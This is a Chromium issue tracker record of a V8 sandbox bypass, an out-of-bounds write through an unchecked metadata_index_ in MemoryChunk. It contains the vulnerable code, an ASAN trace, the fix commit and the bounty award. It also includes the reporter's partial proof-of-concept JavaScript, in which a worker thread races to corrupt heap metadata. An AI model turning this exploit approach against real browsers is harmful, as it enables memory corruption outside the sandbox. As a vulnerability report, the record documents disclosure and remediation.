# V8 Sandbox Bypass: MemoryChunk metadata_pointer_table OOB write

| Field | Value |
|-------|-------|
| **Issue ID** | [389713719](https://issues.chromium.org/issues/389713719) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>JavaScript, Blink>JavaScript>Sandbox |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | v8...@gmail.com |
| **Assignee** | sr...@google.com |
| **Created** | 2025-01-14 |
| **Bounty** | $5,000.00 |

## Description

#### VULNERABILITY DETAILS

At `src/heap/memory-chunk.cc:55`, the `metadata_index_` value is used to index `metadata_pointer_table` without being sanitized (other locations use `MemoryChunkConstants::kMetadataPointerTableSizeMask` to mask the index). A worker thread running in the background may mutate the `metadata_index_` value.

```
MemoryChunk::MemoryChunk(MainThreadFlags flags, MemoryChunkMetadata* metadata)
    : main_thread_flags_(flags),
#ifdef V8_ENABLE_SANDBOXV8 Sandbox Bypass: MemoryChunk metadata_pointer_table OOB write
      metadata_index_(MetadataTableIndex(address())) <--- metadata_index_ is written to the heap here.
#else
      metadata_(metadata)
#endif
{
#ifdef V8_ENABLE_SANDBOX
  MemoryChunkMetadata** metadata_pointer_table = MetadataTableAddress();
  DCHECK_IMPLIES(metadata_pointer_table[metadata_index_] != nullptr,
                 metadata_pointer_table[metadata_index_] == metadata);
  metadata_pointer_table[metadata_index_] = metadata; <--- metadata_index_ is attack controlled and used as index.
#endif
}

```

It's hard to construct a reproducer because it depends on the compiler whether the `metadata_index_` is actually spilled to the heap (and therefore is attacker-controlled).

#### VERSION

V8 commit: `5e6710454cac62520d9ffcc0a843af9d5c90644f` (Wed Jan 8 12:01:58 2025 +0100)

#### REPRODUCTION CASE

Build args:

```
is_debug=false
is_asan=true
v8_enable_sandbox=true
v8_enable_memory_corruption_api=true
dcheck_always_on=false
v8_static_library=true
v8_fuzzilli=false
target_cpu="x64"

```

Shell args: `d8 --single-threaded --sandbox-fuzzing --allow-natives-syntax --expose-gc bug.js`

##### ASAN Report:

```
==3308986==ERROR: AddressSanitizer: global-buffer-overflow on address 0x55556d0ecc30 at pc 0x55555f1f03fc bp 0x7fffffff5200 sp 0x7fffffff51f8
WRITE of size 8 at 0x55556d0ecc30 thread T0
    #0 0x55555f1f03fb in v8::internal::MemoryChunk::MemoryChunk(v8::base::Flags<v8::internal::MemoryChunk::Flag, unsigned long, unsigned long>, v8::internal::MemoryChunkMetadata*) src/heap/memory-chunk.cc:55:43
    #1 0x55555f1d587e in v8::internal::MemoryAllocator::AllocatePage(v8::internal::MemoryAllocator::AllocationMode, v8::internal::Space*, v8::internal::Executability) src/heap/memory-allocator.cc:453:37
    #2 0x55555f296e43 in v8::internal::SemiSpace::AllocateFreshPage() src/heap/new-spaces.cc:145:56
    #3 0x55555f296914 in v8::internal::SemiSpace::EnsureCapacity(unsigned long) src/heap/new-spaces.cc:79:12
    #4 0x55555f297205 in v8::internal::SemiSpace::Commit() src/heap/new-spaces.cc:99:8
    #5 0x55555f2a0226 in v8::internal::SemiSpaceNewSpace::GarbageCollectionPrologue() src/heap/new-spaces.cc:751:20
    #6 0x55555ed60123 in v8::internal::MarkCompactCollector::Prepare() src/heap/mark-compact.cc:774:16
    #7 0x55555e8857c1 in v8::internal::Heap::MarkCompact() src/heap/heap.cc:2622:29
    #8 0x55555e881fc4 in v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::internal::GarbageCollectionReason, char const*) src/heap/heap.cc:2250:5
    #9 0x55555e9f5dbf in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)::$_1::operator()() const src/heap/heap.cc:1664:7
    #10 0x55555e9f4811 in void heap::base::Stack::SetMarkerAndCallbackImpl<v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)::$_1>(heap::base::Stack*, void*, void const*) src/heap/base/stack.h:167:5
    #11 0x555565bb3e02 in PushAllRegistersAndIterateStack push_registers_asm.cc
    #12 0x555565bb2d18 in heap::base::Stack::TrampolineCallbackHelper(void*, void (*)(heap::base::Stack*, void*, void const*)) src/heap/base/stack.cc:199:3
    #13 0x55555e862aac in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) src/heap/base/stack.h:73:7
    #14 0x55555e864cfd in v8::internal::Heap::CollectAllGarbage(v8::base::Flags<v8::internal::GCFlag, unsigned char, unsigned char>, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) src/heap/heap.cc:1274:3
    #15 0x55555e86d44e in v8::internal::Heap::HandleExternalMemoryInterrupt() src/heap/heap.cc:1438:5
    #16 0x55555c7ff798 in v8::Isolate::HandleExternalMemoryInterrupt() src/api/api.cc:9786:9
    #17 0x55555c7ff6a9 in v8::Isolate::AdjustAmountOfExternalAllocatedMemoryImpl(long) src/api/api.cc:9778:5
    #18 0x55555c875e34 in v8::ExternalMemoryAccounter::Increase(v8::Isolate*, unsigned long) src/api/api.cc:12487:12
    #19 0x55555ec627a7 in v8::internal::ArrayBufferSweeper::IncrementExternalMemoryCounters(unsigned long) src/heap/array-buffer-sweeper.cc:425:30
    #20 0x55555ec625b1 in v8::internal::ArrayBufferSweeper::Append(v8::internal::Tagged<v8::internal::JSArrayBuffer>, v8::internal::ArrayBufferExtension*) src/heap/array-buffer-sweeper.cc:366:3
    #21 0x55555e8f39de in v8::internal::Heap::AppendArrayBufferExtension(v8::internal::Tagged<v8::internal::JSArrayBuffer>, v8::internal::ArrayBufferExtension*) src/heap/heap.cc:4211:26
    #22 0x555560e0b1ed in v8::internal::JSArrayBuffer::Attach(std::__Cr::shared_ptr<v8::internal::BackingStore>) src/objects/js-array-buffer.cc:117:20
    #23 0x55555cb79152 in v8::internal::(anonymous namespace)::ConstructBuffer(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::JSReceiver>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::InitializedFlag) src/builtins/builtins-arraybuffer.cc:108:17
    #24 0x55555cb651ba in v8::internal::Builtin_Impl_ArrayBufferConstructor(v8::internal::BuiltinArguments, v8::internal::Isolate*) src/builtins/builtins-arraybuffer.cc:158:10
    #25 0x55555cb5f300 in v8::internal::Builtin_ArrayBufferConstructor(int, unsigned long*, v8::internal::Isolate*) src/builtins/builtins-arraybuffer.cc:116:1
    #26 0x55556be8c775 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc
    #27 0x55556bde2c64 in Builtins_JSBuiltinsConstructStub setup-isolate-deserialize.cc
    #28 0x55556bf47df9 in Builtins_CreateTypedArray setup-isolate-deserialize.cc
    #29 0x55556be79c6a in Builtins_TypedArrayConstructor setup-isolate-deserialize.cc
    #30 0x55556bde66f2 in Builtins_InterpreterPushArgsThenFastConstructFunction setup-isolate-deserialize.cc
    #31 0x55556bf8c5a6 in Builtins_ConstructHandler setup-isolate-deserialize.cc
    #32 0x55556bde5dc0 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #33 0x55556bde391b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #34 0x55556bde366a in Builtins_JSEntry setup-isolate-deserialize.cc
    #35 0x55555dd3e9fd in v8::internal::GeneratedCode<unsigned long, unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**>::Call(unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**) src/execution/simulator.h:191:12
    #36 0x55555dd2fbe0 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:436:22
    #37 0x55555dd3163d in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:536:10
    #38 0x55555c5a773e in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:2155:7
    #39 0x55555c5a5fdc in v8::Script::Run(v8::Local<v8::Context>) src/api/api.cc:2118:10
    #40 0x55555bf7f58a in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1017:44
    #41 0x55555c04a091 in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:4868:10
    #42 0x55555c06c47a in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:5906:37
    #43 0x55555c06a141 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:5815:18
    #44 0x55555c073cfe in v8::Shell::Main(int, char**) src/d8/d8.cc:6700:18
    #45 0x55555c075c81 in main src/d8/d8.cc:6792:43
    #46 0x7ffff7a211c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #47 0x7ffff7a2128a in __libc_start_main csu/../csu/libc-start.c:360:3
    #48 0x55555bd36029 in _start (/work/v8-build/v8/out/FuzzingSuppressReadsO1/d8+0x67e2029) (BuildId: 185bba4278aad262)

0x55556d0ecc30 is located 160 bytes after global variable 'v8::internal::compiler::(anonymous namespace)::GetCommonOperatorGlobalCache()::object' defined in '../../src/compiler/common-operator.cc' (0x55556d0eaf80) of size 7184
SUMMARY: AddressSanitizer: global-buffer-overflow src/heap/memory-chunk.cc:55:43 in v8::internal::MemoryChunk::MemoryChunk(v8::base::Flags<v8::internal::MemoryChunk::Flag, unsigned long, unsigned long>, v8::internal::MemoryChunkMetadata*)
Shadow bytes around the buggy address:
  0x55556d0ec980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x55556d0eca00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x55556d0eca80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x55556d0ecb00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x55556d0ecb80: 00 00 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
=>0x55556d0ecc00: f9 f9 f9 f9 f9 f9[f9]f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x55556d0ecc80: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x55556d0ecd00: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x55556d0ecd80: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x55556d0ece00: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x55556d0ece80: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==3308986==ABORTING

## V8 sandbox violation detected!

```
#### CREDIT INFORMATION

Reporter credit: v8sbxfuzz

## Timeline

### ti...@chromium.org (2025-01-14)

(primary shepherd)

[v8sbxfuzz@gmail.com](mailto:v8sbxfuzz@gmail.com), could you attach bug.js? It will make this a lot easier to reproduce :)

### v8...@gmail.com (2025-01-14)

I'm sorry. I forgot to remove the command line referencing the `bug.js` file. I currently don't have a reproducer since it will likely be hard to create one that works reliably across different binaries. This is due to the exploitability heavily depending on whether `metadata_index_` is spilled and because the attacker's time frame is narrow. Since this bug is straightforward, this should also be fine without a reproducer? 

### pe...@google.com (2025-01-14)

Thank you for providing more feedback. Adding the requester to the CC list.

### ti...@chromium.org (2025-01-14)

(primary shepherd)

[v8sbxfuzz@gmail.com](mailto:v8sbxfuzz@gmail.com), I am curious if you could still upload a reproducer (even if it is platform dependent) just so we can have somewhere to start when reproducing it ourselves? Even if it does not reproduce on our machines it is still *extremely* helpful and saves us a lot of time. If it's not possible to upload a reproducer (i.e. this was found strictly through static analysis) please let us know. Thanks!

### v8...@gmail.com (2025-01-14)

This was found by intercepting (and possibly mutating) reads into the heap sandbox. This is why I am able to provide an ASAN report, but no reproducer since triggering the bugs by intercepting the loads allows finer control without requiring perfect timing.

I started with this, but I haven't gotten it to work so far. I will look into it tomorrow. The idea is the following:

1. create one object (`a`) that causes a `HeapChunk` object to be created.
2. Based on this `HeapChunk`'s address, guess the address of the next (to be created) heap chunk and its `metadata_index_` field.
3. Spawn a thread that corrupts the `metadata_index_` field of the object we create in the next step.
4. Create the second object, `b`, to cause the OOB to write.

I am grateful for any ideas on improving this :)

```
let sbx_memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
Sandbox.getAddressOf(sbx_memory);
let base = Sandbox.base;

// 1.
let a = new BigInt64Array(268435441);
let a_addr = Sandbox.getAddressOf(a) - 0x10;
print("a_addr: 0x" + (base + a_addr).toString(16));

let a_val = sbx_memory.getUint32(a_addr + 8, true);
print("a_val: 0x" + a_val.toString(16));

function corruptInBackground(address) {
    function workerTemplate(address) {
        let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
        while (true) {
            memory.setUint32(address, 0xffff, true);
        }
    }
    const workerCode = new Function(
        `(${workerTemplate})(${address})`);
    return new Worker(workerCode, { type: 'function' });
}

// 2.
let dst_addr = a_addr + 0x1c0000;
print("dst_addr: 0x" + (base + dst_addr).toString(16));

// 3.
let worker = corruptInBackground(dst_addr)

// 4.
let b = new BigInt64Array(268435441);
let b_addr = Sandbox.getAddressOf(b);
print("b_addr: 0x" + b_addr.toString(16));

```

### pe...@google.com (2025-01-14)

Thank you for providing more feedback. Adding the requester to the CC list.

### ti...@chromium.org (2025-01-14)

(primary shepherd)

Thank you for the reproducer and context, it was super helpful. This looks valid to me. Assigning to V8 shepherd.

### ap...@google.com (2025-01-15)

Project: v8/v8  

Branch: main  

Author: Stephen Roettger <[sroettger@google.com](mailto:sroettger@google.com)>  

Link:      <https://chromium-review.googlesource.com/6172044>

[sandbox] use off-heap data during MemChunk initialization

---


Expand for full commit details
```
[sandbox] use off-heap data during MemChunk initialization 
 
The metadata_pointer_table initialization shouldn't use metadata_index_ 
without checking since it's inside the heap. 
 
Bug: 389713719 
Change-Id: I09d6771de57e837131ccf3e07185f1da6ae756cf 
Fixed: 389713719 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6172044 
Reviewed-by: Dominik Inführ <dinfuehr@chromium.org> 
Commit-Queue: Stephen Röttger <sroettger@google.com> 
Cr-Commit-Position: refs/heads/main@{#98114}

```

---

Files:

- M `src/heap/memory-chunk.cc`

---

Hash: d10f27ddfd7eade63801c06a27dcb9e28966094b  

Date:  Wed Jan 15 09:58:56 2025


---

### sp...@google.com (2025-01-23)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $5000.00 for this report.

Rationale for this decision:
V8 sandbox bypass demonstrating memory corruption outside the sandbox


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2025-01-23)

And another one! Thank you for your efforts in fuzzing the V8 sandbox -- nice work!

### ch...@google.com (2025-04-24)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/389713719)*
